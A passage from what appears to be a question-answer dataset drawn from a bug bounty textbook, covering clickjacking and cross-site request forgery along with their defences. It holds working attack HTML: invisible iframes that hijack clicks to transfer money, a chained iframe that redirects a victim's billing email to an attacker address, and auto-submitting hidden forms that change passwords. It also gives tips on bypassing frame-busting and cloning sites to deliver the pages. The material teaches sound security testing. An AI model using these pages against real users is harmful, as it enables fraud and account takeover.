banking page in an\niframe on their own site, like this:\n<html>\n<h3>Welcome to my site!</h3>\n<iframe src=\"https://www.example.com/transfer_money?\nrecipient=attacker_account_12345&amount=5000\"\nwidth=\"500\" height=\"500\">\n</iframe>\n</html>\nThis iframe embeds the URL for the balance transfer page. It also passes\nin the URL parameters to prefill the transfer recipient and amount. The\nattacker hides this iframe on a website that appears to be harmless, then\ntricks the user into clicking a button on the sensitive page. To achieve this,\nthey overlay multiple HTML elements in a way that obscures the banking\nform. Take a look at this HTML page, for example:\n<html>\n<style>\n#victim-site {\nwidth:500px;\n146 Chapter 8\nheight:500px;\n1 opacity:0.00001;\n2 z-index:1;\n}\n#decoy {\n3 position:absolute;\nwidth:500px;\nheight:500px;\n4 z-index:-1;\n}\n</style>\n<div id=\"decoy\">\n<h3>Welcome to my site!</h3>\n<h3>This is a cybersecurity newsletter that focuses on bug\nbounty news and write-ups!\nPlease subscribe to my newsletter below to receive new\ncybersecurity articles in your email inbox!</h3>\n<form action=\"/subscribe\" method=\"post\">\n<label for=\"email\">Email:</label>\n5 <br>\n<input type=\"text\" id=\"email\" value=\"Please enter your email!\">\n6 <br><br>\n<input type=\"submit\" value=\"Submit\">\n</form>\n</div>\n<iframe id=\"victim-site\"\nsrc=\"https://www.example.com/transfer_money?\nrecipient=attacker_account_12345&amount=5000\"\nwidth=\"500\" height=\"500\">\n</iframe>\n</html>\nYou can see that we’ve added a <style> tag at the top of the HTML\npage. Anything between <style> tags is CSS code used to specify the styl-\ning of HTML elements, such as font color, element size, and transparency.\nWe can style HTML elements by assigning them IDs and referencing these\nin our style sheet.\nHere, we set the position of our decoy element to absolute to make the\ndecoy site overlap with the iframe containing the victim site 3. Without the\nabsolute position directive, HTML would display these elements on separate\nparts of the screen. The decoy element includes a Subscribe to Newsletter\nbutton, and we carefully position the iframe so the Transfer Balance but-\nton sits directly on top of this Subscribe button, using new lines created by\nHTML’s line break tag <br> 5 6. We then make the iframe invisible by set-\nting its opacity to a very low value 1. Finally, we set the z-index of the iframe\nto a higher value than the decoys 2 4. The z-index sets the stack order of\ndifferent HTML elements. If two HTML elements overlap, the one with the\nhighest z-index will be on top.\nBy setting these CSS properties for the victim site iframe and decoy form,\nwe get a page that looks like it’s for subscribing to a newsletter, but contains\nan invisible form that transfers the user’s money into the attacker’s account.\nClickjacking 147\nLet’s turn the opacity of the iframe back to opacity:1 to see how the page\nis actually laid out. You can see that the Transfer Balance button is located\ndirectly on top of the Subscribe to Newsletter button (Figure 8-4).\nFigure 8-4: The Transfer Balance button lies directly on top of the Subscribe button.\nVictims think they’re subscribing to a newsletter, but they’re actually clicking the button to\nauthorize a balance transfer.\nOnce we reset the opacity of the iframe to opacity:0.00001 to make\nthe sensitive form invisible, the site looks like a normal newsletter page\n(Figure 8-5).\nFigure 8-5: The attacker tricks users into clicking the button by making the sensitive form\ninvisible.\nIf the user is logged into the banking site, they’ll be logged into the\niframe too, so the banking site’s server will recognize the requests sent by\nthe iframe as legit. When the user clicks the seemingly harmless button,\nthey’re executing a balance transfer on example.com! They’ll have acciden-\ntally transferred $5,000 from their bank account balance to the attacker’s\naccount instead of subscribing to a newsletter. This is why we call this attack\nuser-interface redressing or clickjacking: the attacker redressed the user inter-\nface to hijack user clicks, repurposing the clicks meant for their page and\nusing them on a victim site.\n148 Chapter 8\nThis is a simplified example. In reality, payment applications will not\nbe implemented this way, because it would violate data security standards.\nAnother thing to remember is that the presence of an easy-to-prevent vul-\nnerability on a critical functionality, like a clickjacking vulnerability on the\nbalance transfer page, is a symptom that the application does not follow the\nbest practices of secure development. This example application is likely to\ncontain other vulnerabilities, and you should test it extensively.\nPrevention\nTwo conditions must be met for a clickjacking vulnerability to happen. First,\nthe vulnerable page has to have functionality that executes a state-changing\naction on the user’s behalf. A state-changing action causes changes to the\nuser’s account in some way, such as changing the user’s account settings or\npersonal data. Second, the vulnerable page has to allow itself to be framed\nby an iframe on another site.\nThe HTTP response header X-Frame-Options lets web pages indicate\nwhether the page’s contents can be rendered in an iframe. Browsers will\nfollow the directive of the header provided. Otherwise, pages are frameable\nby default.\nThis header offers two options: DENY and SAMEORIGIN. If a page is served\nwith the DENY option, it cannot be framed at all. The SAMEORIGIN option allows\nframing from pages of the same origin: pages that share the same protocol,\nhost, and port.\nX-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN\nTo prevent clickjacking on sensitive actions, the site should serve one of\nthese options on all pages that contain state-changing actions.\nThe Content-Security-Policy response header is another possible defense\nagainst clickjacking. This header’s frame-ancestors directive allows sites to\nindicate whether a page can be framed. For example, setting the directive\nto 'none' will prevent any site from framing the page, whereas setting the\ndirective to 'self' will allow the current site to frame the page:\nContent-Security-Policy: frame-ancestors 'none';\nContent-Security-Policy: frame-ancestors 'self';\nSetting frame-ancestors to a specific origin will allow that origin to frame\nthe content. This header will allow the current site, as well as any page on the\nsubdomains of example.com, to frame its contents:\nContent-Security-Policy: frame-ancestors 'self' *.example.com;\nBesides implementing X-Frame-Options and the Content-Security-Policy\nto ensure that sensitive pages cannot be framed, another way of protecting\nagainst clickjacking is with SameSite cookies. A web application instructs\nClickjacking 149\nthe user’s browser to set cookies via a Set-Cookie header. For example, this\nheader will make the client browser set the value of the cookie PHPSESSID to\nUEhQU0VTU0lE:\nSet-Cookie: PHPSESSID=UEhQU0VTU0lE\nIn addition to the basic cookie_name=cookie_value designation, the Set-Cookie\nheader allows several optional flags you can use to protect your users’ cook-\nies. One of them is the SameSite flag, which helps prevent clickjacking attacks.\nWhen the SameSite flag on a cookie is set to Strict or Lax, that cookie won't be\nsent in requests made within a third-party iframe:\nSet-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict\nSet-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax\nThis means that any clickjacking attack that requires the victim to be\nauthenticated, like the banking example we mentioned earlier, would not\nwork, even if no HTTP response header restricts framing, because the vic-\ntim won’t be authenticated in the clickjacked request.\nHunting for Clickjacking\nFind clickjacking vulnerabilities by looking for pages on the target site that\ncontain sensitive state-changing actions and can be framed.\nStep 1: Look for State-Changing Actions\nClickjacking vulnerabilities are valuable only when the target page contains\nstate-changing actions. You should look for pages that allow users to make\nchanges to their accounts, like changing their account details or settings.\nOtherwise, even if an attacker can hijack user clicks, they can’t cause any\ndamage to the website or the user’s account. That’s why you should start\nby spotting the state-changing actions on a site.\nFor example, let’s say you’re testing a subdomain of example.com that\nhandles banking functionalities at bank.example.com. Go through all the\nfunctionalities of the web application, click all the links, and write down\nall the state-changing options, along with the URL of the pages they’re\nhosted on:\nState-changing requests on bank.example.com\n• Change password: bank.example.com/password_change\n• Transfer balance: bank.example.com/transfer_money\n• Unlink external account: bank.example.com/unlink\nYou should also check that the action can be achieved via clicks alone.\nClickjacking allows you to forge only a user’s clicks, not their keyboard actions.\nAttacks that require users to explicitly type in values are possible, but generally\nnot feasible because they require so much social engineering. For example,\n150 Chapter 8\non this banking page, if the application requires users to explicitly type the\nrecipient account and transfer amount instead of loading them from a URL\nparameter, attacking it with clickjacking would not be feasible.\nStep 2: Check the Response Headers\nThen go through each of the state-changing functionalities you’ve found\nand revisit the pages that contain them. Turn on your proxy and intercept\nthe HTTP response that contains that web page. See if the page is being\nserved with the X-Frame-Options or Content-Security-Policy header.\nIf the page is served without any of these headers, it may be vulnerable\nto clickjacking. And if the state-changing action requires users to be logged\nin when it is executed, you should also check if the site uses SameSite cook-\nies. If it does, you won’t be able to exploit a clickjacking attack on the site’s\nfeatures that require authentication.\nAlthough setting HTTP response headers is the best way to prevent these\nattacks, the website might have more obscure safeguards in place. For example,\na technique called frame-busting uses JavaScript code to check if the page is in\nan iframe, and if it’s framed by a trusted site. Frame-busting is an unreliable\nway to protect against clickjacking. In fact, frame-busting techniques can often\nbe bypassed, as I will demonstrate later in this chapter.\nYou can confirm that a page is frameable by creating an HTML page\nthat frames the target page. If the target page shows up in the frame, the\npage is frameable. This piece of HTML code is a good template:\n<HTML>\n<head>\n<title>Clickjack test page</title>\n</head>\n<body>\n<p>Web page is vulnerable to clickjacking if the iframe is populated with the target\npage!</p>\n<iframe src=\"URL_OF_TARGET_PAGE\" width=\"500\" height=\"500\"></iframe>\n</body>\n</html>\nStep 3: Confirm the Vulnerability\nConfirm the vulnerability by executing a clickjacking attack on your test\naccount. You should try to execute the state-changing action through the\nframed page you just constructed and see if the action succeeds. If you can\ntrigger the action via clicks alone through the iframe, the action is vulner-\nable to clickjacking.\nBypassing Protections\nClickjacking isn’t possible when the site implements the proper protections.\nIf a modern browser displays an X-Frame-Options protected page, chances are\nyou can’t exploit clickjacking on the page, and you’ll have to find another\nClickjacking 151\nvulnerability, such as XSS or CSRF, to achieve the same results. Sometimes,\nhowever, the page won’t show up in your test iframe even though it lacks the\nheaders that prevent clickjacking. If the website itself fails to implement com-\nplete clickjacking protections, you might be able to bypass the mitigations.\nHere’s an example of what you can try if the website uses frame-busting\ntechniques instead of HTTP response headers and SameSite cookies: find\na loophole in the frame-busting code. For instance, developers commonly\nmake the mistake of comparing only the top frame to the current frame\nwhen trying to detect whether the protected page is framed by a malicious\npage. If the top frame has the same origin as the framed page, develop-\ners may allow it, because they deem the framing site’s domain to be safe.\nEssentially, the protection’s code has this structure:\nif (top.location == self.location){\n// Allow framing.\n}\nelse{\n// Disallow framing.\n}\nIf that is the case, search for a location on the victim site that allows you to\nembed custom iframes. For example, many social media sites allows users to\nshare links on their profile. These features often work by embedding the URL\nin an iframe to display information and a thumbnail of the link. Other com-\nmon features that require custom iframes are those that allow you to embed\nvideos, audio, images, and custom advertisements and web page builders.\nIf you find one of these features, you might be able to bypass clickjack-\ning protection by using the double iframe trick. This trick works by framing\nyour malicious page within a page in the victim’s domain. First, construct a\npage that frames the victim’s targeted functionality. Then place the entire\npage in an iframe hosted by the victim site (Figure 8-6).\nFigure 8-6: You can try to place your site in an iframe hosted by the victim site to bypass\nimproper frame checking.\nThis way, both top.location and self.location point to victim.com. The\nframe-busting code would determine that the innermost victim.com page\nis framed by another victim.com page within its domain, and therefore deem\nthe framing safe. The intermediary attacker page would go undetected.\nAlways ask yourself if the developer may have missed any edge cases\nwhile implementing protection mechanisms. Can you exploit these edge\ncases to your advantage?\n152 Chapter 8\nLet’s take a look at an example report. Periscope is a live streaming\nvideo application, and on July 10, 2019, it was found to be vulnerable to a\nclickjacking vulnerability. You can find the disclosed bug report at https://\nhackerone.com/reports/591432/. The site was using the X-Frame-Options ALLOW-FROM\ndirective to prevent clickjacking. This directive lets pages specify the URLs\nthat are allowed to frame it, but it’s an obsolete directive that isn’t supported\nby many browsers. This means that all features on the subdomains https://\ncanary-web.pscp.tv and https://canary-web.periscope.tv were vulnerable to click-\njacking if the victim was using a browser that didn’t support the directive,\nsuch as the latest Chrome, Firefox, and Safari browsers. Since Periscope’s\naccount settings page allows users to deactivate their accounts, an attacker\ncould, for example, frame the settings page and trick users into deactivating\ntheir accounts.\nEscalating the Attack\nWebsites often serve pages without clickjacking protection. As long as the\npage doesn’t contain exploitable actions, the lack of clickjacking protection\nisn’t considered a vulnerability. On the other hand, if the frameable page\ncontains sensitive actions, the impact of clickjacking would be correspond-\ningly severe.\nFocus on the application’s most critical functionalities to achieve maxi-\nmum business impact. For example, let’s say a site has two frameable pages.\nThe first page contains a button that performs transfers of the user’s bank\nbalance, while the second contains a button that changes the user’s theme\ncolor on the website. While both of these pages contain clickjacking vulner-\nabilities, the impact of a clickjacking bug is significantly higher on the first\npage than on the second.\nYou can also combine multiple clickjacking vulnerabilities or chain click-\njacking with other bugs to pave the way to more severe security issues. For\ninstance, applications often send or disclose information according to user\npreferences. If you can change these settings via clickjacking, you can often\ninduce sensitive information disclosures. Let’s say that bank.example.com con-\ntains multiple clickjacking vulnerabilities. One of them allows attackers to\nchange an account’s billing email, and another one allows attackers to send\nan account summary to its billing email. The malicious page’s HTML looks\nlike this:\n<html>\n<h3>Welcome to my site!</h3>\n<iframe\nsrc=\"https://bank.example.com/change_billing_email?email=attacker@attacker.com\"\nwidth=\"500\" height=\"500\">\n</iframe>\n<iframe src=\"https://bank.example.com/send_summary\" width=\"500\" height=\"500\">\n</iframe>\n</html>\nClickjacking 153\nYou could first change the victim’s billing email to your own email, then\nmake the victim send an account summary to your email address to leak the\ninformation contained in the account summary report. Depending on what\nthe account summary discloses, you might be able to collect data including\nthe street address, phone numbers, and credit card information associated\nwith the account! Note that for this attack to succeed, the victim user would\nhave to click the attacker’s site twice.\nA Note on Delivering the Clickjacking Payload\nOften in bug bounty reports, you’ll need to show companies that real attack-\ners could effectively exploit the vulnerability you found. That means you\nneed to understand how attackers can exploit clickjacking bugs in the wild.\nClickjacking vulnerabilities rely on user interaction. For the attack\nto succeed, the attacker would have to construct a site that is convincing\nenough for users to click. This usually isn’t difficult, since users don’t often\ntake precautions before clicking web pages. But if you want your attack to\nbecome more convincing, check out the Social-Engineer Toolkit (https://\ngithub.com/trustedsec/social-engineer-toolkit/). This set of tools can, among\nother things, help you clone famous websites and use them for malicious\npurposes. You can then place the iframe on the cloned website.\nIn my experience, the most effective location in which to place the\nhidden button is directly on top of a Please Accept That This Site Uses\nCookies! pop-up. Users usually click this button to close the window with-\nout much thought.\nFinding Your First Clickjacking Vulnerability!\nNow that you know what clickjacking bugs are, how to exploit them, and\nhow to escalate them, go find your first clickjacking vulnerability! Follow\nthe steps described in this chapter:\n1. Spot the state-changing actions on the website and keep a note of their\nURL locations. Mark the ones that require only mouse clicks to execute\nfor further testing.\n2. Check these pages for the X-Frame-Options, Content-Security-Policy header,\nand a SameSite session cookie. If you can’t spot these protective features,\nthe page might be vulnerable!\n3. Craft an HTML page that frames the target page, and load that page in\na browser to see if the page has been framed.\n4. Confirm the vulnerability by executing a simulated clickjacking attack\non your own test account.\n5. Craft a sneaky way of delivering your payload to end users, and consider\nthe larger impact of the vulnerability.\n6. Draft your first clickjacking report!\n154 Chapter 8",
    "question": "What is clickjacking and how can it be exploited to perform unauthorized actions on a website?",
    "summary": "Clickjacking is an attack where users are tricked into clicking on a malicious button that appears legitimate. Attackers use HTML iframes to hide the vulnerable page and overlay it with a deceptive interface. To prevent clickjacking, websites can use headers like X-Frame-Options and Content-Security-Policy, as well as SameSite cookies. Testing for clickjacking involves identifying pages with sensitive actions, checking for protective headers, and confirming the vulnerability through simulated attacks."
  },
  {
    "start": 107,
    "end": 121,
    "text": "9\nCROSS-SITE REQUEST FORGERY\nCross-site request forgery (CSRF) is a client-\nside technique used to attack other users\nof a web application. Using CSRF, attackers\ncan send HTTP requests that pretend to come\nfrom the victim, carrying out unwanted actions on a\nvictim’s behalf. For example, an attacker could change\nyour password or transfer money from your bank\naccount without your permission.\nCSRF attacks specifically target state-changing requests, like sending\ntweets and modifying user settings, instead of requests that reveal sensitive\nuser info. This is because attackers won’t be able to read the response to the\nforged requests sent during a CSRF attack. Let’s get into how this attack works.\nMechanisms\nRemember from Chapter 3 that most modern web applications authenticate\ntheir users and manage user sessions by using session cookies. When you\nfirst log in to a website, the web server establishes a new session: it sends your\nbrowser a session cookie associated with the session, and this cookie proves\nyour identity to the server. Your browser stores the session cookies associated\nwith that website and sends them along with every subsequent request you\nsend to the site. This all happens automatically, without the user’s involvement.\nFor example, when you log into Twitter, the Twitter server sends your\nbrowser the session cookie via an HTTP response header called Set-Cookie:\nSet-Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE;\nYour browser receives the session cookie, stores it, and sends it along\nvia the Cookie HTTP request header in every one of your requests to Twitter.\nThis is how the server knows your requests are legit:\nCookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE;\nArmed with your session cookie, you can carry out authenticated actions\nlike accessing confidential information, changing your password, or sending\na private message without reentering your password. To get ahold of your\nown session cookies, intercept the requests your browsers send to the site\nafter you’ve logged in.\nNow let’s say there’s a Send a Tweet HTML form on Twitter’s web page.\nUsers can enter their tweets by using this form and clicking the Submit but-\nton to send them (Figure 9-1).\nFigure 9-1: An example HTML form that\nallows users to send a tweet\nNote that Twitter doesn’t really use this form (and Twitter’s actual Send\na Tweet functionality isn’t vulnerable to CSRF attacks). The source code of\nthe example HTML form looks like this:\n<html>\n1 <h1>Send a tweet.</h1>\n2 <form method=\"POST\" action=\"https://twitter.com/send_a_tweet\">\n3 <input type=\"text\" name=\"tweet_content\" value=\"Hello world!\">\n4 <input type=\"submit\" value=\"Submit\">\n</form>\n</html>\nThe <h1> tags denote a first-level HTML heading 1, whereas the <form>\ntags define the beginning and end of an HTML form 2. The form has the\n156 Chapter 9\nmethod attribute POST and the action attribute https://twitter.com/send_a\n_tweet. This means that the form will submit a POST request to the https://\ntwitter.com/send_a_tweet endpoint when the user clicks Submit. Next, an\n<input> tag defines a text input with the default value of Hello world!. When\nthe form is submitted, any user input in this field will be sent as a POST\nparameter named tweet_content 3. A second input tag defines the Submit\nbutton 4. When users click this button, the form will be submitted.\nWhen you click the Submit button on the page, your browser will send\na POST request to https://twitter.com/send_a_tweet. The browser will include\nyour Twitter session cookie with the request. You could see the request\ngenerated by the form in your proxy. It should look something like this:\nPOST /send_a_tweet\nHost: twitter.com\nCookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE\n(POST request body)\ntweet_content=\"Hello world!\"\nThis functionality has a vulnerability: any site, and not just Twitter, can\ninitiate this request. Imagine that an attacker hosts their own website that\ndisplays an HTML form like Figure 9-2.\nFigure 9-2: An example HTML form that an attacker\nuses to exploit a CSRF vulnerability\nThe page’s source code is the following:\n<html>\n<h1>Please click Submit.</h1>\n<form method=\"POST\" action=\"https://twitter.com/send_a_tweet\" id=\"csrf-form\">\n<input type=\"text\" name=\"tweet_content\" value=\"Follow @vickieli7 on Twitter!\">\n<input type='submit' value=\"Submit\">\n</form>\n</html>\nWhen you click the Submit button on this page, your browser will send\na POST request. Because the browser automatically includes your Twitter\nsession cookies in requests to Twitter, Twitter will treat the request as valid,\ncausing your account to tweet Follow @vickieli7 on Twitter! Here’s the cor-\nresponding request:\nPOST /send_a_tweet\nHost: twitter.com\nCookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE\nCross-Site Request Forgery 157\n(POST request body)\ntweet_content=\"Follow @vickieli7 on Twitter!\"\nEven though this request doesn’t come from Twitter, Twitter will rec-\nognize it as valid because it includes your real Twitter session cookie. This\nattack would make you send the tweet every time you click Submit on the\nmalicious page.\nIt’s true that this attack page isn’t very useful: it requires the victim to\nclick a button, which most users probably won’t do. How can attackers make\nthe exploit more reliable? Realistically, a malicious CSRF page would look\nmore like this:\n<html>\n<iframe style=\"display:none\" name=\"csrf-frame\"> 1\n<form method=\"POST\" action=\"https://twitter.com/send_a_tweet\"\ntarget=\"csrf-frame\" id=\"csrf-form\"> 2\n<input type=\"text\" name=\"tweet_content\" value=\"Follow @vickieli7 on Twitter!\">\n<input type='submit' value=\"Submit\">\n</form>\n</iframe>\n<script>document.getElementById(\"csrf-form\").submit();</script> 3\n</html>\nThis HTML places the form in an invisible iframe to hide it from the\nuser’s view. Remember from Chapter 8 that an iframe is an HTML element\nthat embeds another document within the current HTML document. This\nparticular iframe’s style is set to display:none, meaning it won’t be displayed\non the page, making the form invisible 1. Then, JavaScript code between\nthe script tags 3 will submit the form with the ID csrf-form 2 without the\nneed for user interaction. The code fetches the HTML form by referring to\nit by its ID, csrf-form. Then the code submits the form by calling the submit()\nmethod on it. With this new attack page, any victim who visits the malicious\nsite will be forced to tweet.\nWhat attackers can actually accomplish with a real CSRF vulnerability\ndepends on where the vulnerability is found. For example, let’s say a request\nthat empties a user’s online shopping cart has a CSRF vulnerability. When\nexploited in the wild, this vulnerability can at most cause annoyance to the\nsite users. It doesn’t have the potential to cause any major financial harm or\nidentity theft.\nOn the other hand, some CSRFs can lead to much bigger issues. If a\nCSRF vulnerability is present on requests used to change a user’s password,\nfor example, an attacker can change other users’ passwords against their\nwill and take over their entire accounts! And when a CSRF appears in func-\ntionalities that handle user finances, like account balance transfers, attack-\ners can potentially cause unauthorized balance transfers out of the victim’s\nbank account. You can also use CSRFs to trigger injection vulnerabilities\nsuch as XSS and command injections.\n158 Chapter 9\nPrevention\nThe best way to prevent CSRFs is to use CSRF tokens. Applications can\nembed these random and unpredictable strings in every form on their\nwebsite, and browsers will send this string along with every state-changing\nrequest. When the request reaches the server, the server can validate the\ntoken to make sure the request indeed originated from its website. This\nCSRF token should be unique for each session and/or HTML form so\nattackers can’t guess the token’s value and embed it on their websites.\nTokens should have sufficient entropy so that they cannot be deduced by\nanalyzing tokens across sessions.\nThe server generates random CSRF tokens and embeds correct CSRF\ntokens in forms on the legitimate site. Notice the new input field used to\nspecify a CSRF token:\n<form method=\"POST\" action=\"https://twitter.com/send_a_tweet\">\n<input type=\"text\" name=\"tweet_content\" value=\"Hello world!\">\n<input type=\"text\" name=\"csrf_token\" value=\"871caef0757a4ac9691aceb9aad8b65b\">\n<input type=\"submit\" value=\"Submit\">\n</form>\nTwitter’s server can require that the browser send the correct value of\nthe csrf_token POST parameter along with the request for it to be success-\nful. If the value of csrf_token is missing or incorrect, the server should see\nthe request as fake and reject it.\nHere is the resulting POST request:\nPOST /send_a_tweet\nHost: twitter.com\nCookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE\n(POST request body)\ntweet_content=\"Hello world!\"&csrf_token=871caef0757a4ac9691aceb9aad8b65b\nMany frameworks have CSRF tokens built in, so often you can simply\nuse your framework’s implementation.\nBesides implementing CSRF tokens to ensure the authenticity of\nrequests, another way of protecting against CSRF is with SameSite cookies.\nThe Set-Cookie header allows you to use several optional flags to protect\nyour users’ cookies, one of which is the SameSite flag. When the SameSite flag\non a cookie is set to Strict, the client’s browser won’t send the cookie during\ncross-site requests:\nSet-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict\nAnother possible setting for the SameSite flag is Lax, which tells the cli-\nent’s browser to send a cookie only in requests that cause top-level naviga-\ntion (when users actively click a link and navigate to the site). This setting\nensures that users still have access to the resources on your site if the cross-\nsite request is intentional. For example, if you navigate to Facebook from\nCross-Site Request Forgery 159\na third-party site, your Facebook logins will be sent. But if a third-party\nsite initiates a POST request to Facebook or tries to embed the contents of\nFacebook within an iframe, cookies won’t be sent:\nSet-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax\nSpecifying the SameSite attribute is good protection against CSRF because\nboth the Strict and Lax settings will prevent browsers from sending cookies on\ncross-site form POST or AJAX requests, and within iframes and image tags.\nThis renders the classic CSRF hidden-form attack useless.\nIn 2020, Chrome and a few other browsers made SameSite=Lax the default\ncookie setting if it’s not explicitly set by the web application. Therefore, even\nif a web application doesn’t implement CSRF protection, attackers won’t be\nable to attack a victim who uses Chrome with POST CSRF. The efficacy of\na classic CSRF attack will likely be greatly reduced, since Chrome has the\nlargest web browser market share. On Firefox, the SameSite default setting is\na feature that needs to be enabled. You can enable it by going to about:config\nand setting network.cookie.sameSite.laxByDefault to true.\nEven when browsers adopt the SameSite-by-default policy, CSRFs are still\npossible under some conditions. First, if the site allows state-changing requests\nwith the GET HTTP method, third-party sites can attack users by creating\nCSRF with a GET request. For example, if the site allows you to change a\npassword with a GET request, you could post a link like this to trick users into\nclicking it: https://email.example.com/password_change?new_password=abc123.\nSince clicking this link will cause top-level navigation, the user’s ses-\nsion cookies will be included in the GET request, and the CSRF attack\nwill succeed:\nGET /password_change?new_password=abc123\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\nIn another scenario, sites manually set the SameSite attribute of a cookie\nto None. Some web applications have features that require third-party sites\nto send cross-site authenticated requests. In that case, you might explicitly\nset SameSite on a session cookie to None, allowing the sending of the cookie\nacross origins, so traditional CSRF attacks would still work. Finally, if the\nvictim is using a browser that doesn’t set the SameSite attribute to Lax by\ndefault (including Firefox, Internet Explorer, and Safari), traditional CSRF\nattacks will still work if the target application doesn’t implement diligent\nCSRF protection.\nWe’ll explore other ways of bypassing CSRF protection later in this\nchapter. For now, just remember: when websites don’t implement SameSite\ncookies or other CSRF protection for every state-changing request, the\nrequest becomes vulnerable to CSRF if the user is not using a SameSite-\nby-default browser. CSRF protection is still the responsibility of the website\ndespite the adoption of SameSite-by-default.\n160 Chapter 9\nHunting for CSRFs\nCSRFs are common and easy to exploit. To look for them, start by discover-\ning state-changing requests that aren’t shielded by CSRF protections. Here’s\na three-step process for doing so. Remember that because browsers like\nChrome offer automatic CSRF protection, you need to test with another\nbrowser, such as Firefox.\nStep 1: Spot State-Changing Actions\nActions that alter the users’ data are called state-changing actions. For example,\nsending tweets and modifying user settings are both state-changing. The first\nstep of spotting CSRFs is to log in to your target site and browse through it in\nsearch of any activity that alters data.\nFor example, let’s say you’re testing email.example.com, a subdomain of\nexample.com that handles email. Go through all the app’s functionalities,\nclicking all the links. Intercept the generated requests with a proxy like\nBurp and write down their URL endpoints.\nRecord these endpoints one by one, in a list like the following, so you\ncan revisit and test them later:\nState-changing requests on email.example.com\n• Change password: email.example.com/password_change\nPOST request\nRequest parameters: new_password\n• Send email: email.example.com/send_email\nPOST request\nRequest parameters: draft_id, recipient_id\n• Delete email: email.example.com/delete_email\nPOST request\nRequest parameters: email_id\nStep 2: Look for a Lack of CSRF Protections\nNow visit these endpoints to test them for CSRFs. First, open up Burp Suite\nand start intercepting all the requests to your target site in the Proxy tab.\nToggle the Intercept button until it reads Intercept is on (Figure 9-3).\nFigure 9-3: Set to Intercept is on to capture your browser’s traffic. Click the Forward\nbutton to forward the current request to the server.\nCross-Site Request Forgery 161\nLet Burp run in the background to record other traffic related to your\ntarget site while you’re actively hunting for CSRFs. Keep clicking the Forward\nbutton until you encounter the request associated with the state-changing\naction. For example, let’s say you’re testing whether the password-change\nfunction you discovered is vulnerable to CSRFs. You’ve intercepted the\nrequest in your Burp proxy:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\n(POST request body)\nnew_password=abc123\nIn the intercepted request, look for signs of CSRF protection mecha-\nnisms. Use the search bar at the bottom of the window to look for the string\n\"csrf\" or \"state\". CSRF tokens can come in many forms besides POST body\nparameters; they sometimes show up in request headers, cookies, and URL\nparameters as well. For example, they might show up like the cookie here:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b\n(POST request body)\nnew_password=abc123\nBut even if you find a CSRF protection present on the endpoint, you\ncould try a variety of protection-bypass techniques. I’ll talk about them\nlater in the chapter.\nStep 3: Confirm the Vulnerability\nAfter you’ve found a potentially vulnerable endpoint, you’ll need to confirm\nthe vulnerability. You can do this by crafting a malicious HTML form that\nimitates the request sent by the legitimate site.\nCraft an HTML page like this in your text editor. Make sure to save it\nwith an .html extension! This way, your computer will open the file with a\nbrowser by default:\n<html>\n<form method=\"POST\" action=\"https://email.example.com/password_change\" id=\"csrf-form\"> 1\n<input type=\"text\" name=\"new_password\" value=\"abc123\"> 2\n<input type=\"submit\" value=\"Submit\"> 3\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script> 4\n</html>\nThe <form> tag specifies that you’re defining an HTML form. An HTML\nform’s method attribute specifies the HTML method of the request gener-\nated by the form, and the action attribute specifies where the request will be\n162 Chapter 9\nsent to 1. The form generates a POST request to the endpoint https://email\n.example.com/password_change. Next are two input tags. The first one defines\na POST parameter with the name new_password and the value abc123 2.\nThe second one specifies a Submit button 3. Finally, the <script> tag at\nthe bottom of the page contains JavaScript code that submits the form\nautomatically 4.\nOpen the HTML page in the browser that is signed into your target\nsite. This form will generate a request like this:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\n(POST request body)\nnew_password=abc123\nCheck if your password on email.example.com has been changed to\nabc123. In other words, check if the target server has accepted the request\ngenerated by your HTML page. The goal is to prove that a foreign site can\ncarry out state-changing actions on a user’s behalf.\nFinally, some websites might be missing CSRF tokens but still protect\nagainst CSRF attacks by checking if the referer header of the request matches\na legitimate URL. Checking the referer header protects against CSRF,\nbecause these headers help servers filter out requests that have originated\nfrom foreign sites. Confirming a CSRF vulnerability like this can help you\nrule out endpoints that have referer-based CSRF protection.\nHowever, it’s important for developers to remember that referer head-\ners can be manipulated by attackers and aren’t a foolproof mitigation\nsolution. Developers should implement a combination of CSRF tokens and\nSameSite session cookies for the best protection.\nBypassing CSRF Protection\nModern websites are becoming more secure. These days, when you exam-\nine requests that deal with sensitive actions, they’ll often have some form\nof CSRF protection. However, the existence of protections doesn’t mean\nthat the protection is comprehensive, well implemented, and impossible to\nbypass. If the protection is incomplete or faulty, you might still be able to\nachieve a CSRF attack with a few modifications to your payload. Let’s talk\nabout techniques you can use to bypass CSRF protection implemented on\nwebsites.\nExploit Clickjacking\nIf the endpoint uses CSRF tokens but the page itself is vulnerable to click-\njacking, an attack discussed in Chapter 8, you can exploit clickjacking to\nachieve the same results as a CSRF.\nThis is because, in a clickjacking attack, an attacker uses an iframe to\nframe the page in a malicious site while having the state-changing request\nCross-Site Request Forgery 163\noriginate from the legitimate site. If the page where the vulnerable end-\npoint is located is vulnerable to clickjacking, you’ll be able to achieve the\nsame results as a CSRF attack on the endpoint, albeit with a bit more effort\nand CSS skills.\nCheck a page for clickjacking by using an HTML page like the follow-\ning one. You can place a page in an iframe by specifying its URL as the src\nattribute of an <iframe> tag. Then, render the HTML page in your browser.\nIf the page that the state-changing function is located in appears in your\niframe, the page is vulnerable to clickjacking:\n<html>\n<head>\n<title>Clickjack test page</title>\n</head>\n<body>\n<p>This page is vulnerable to clickjacking if the iframe is not blank!</p>\n<iframe src=\"PAGE_URL\" width=\"500\" height=\"500\"></iframe>\n</body>\n</html>\nThen you could use clickjacking to trick users 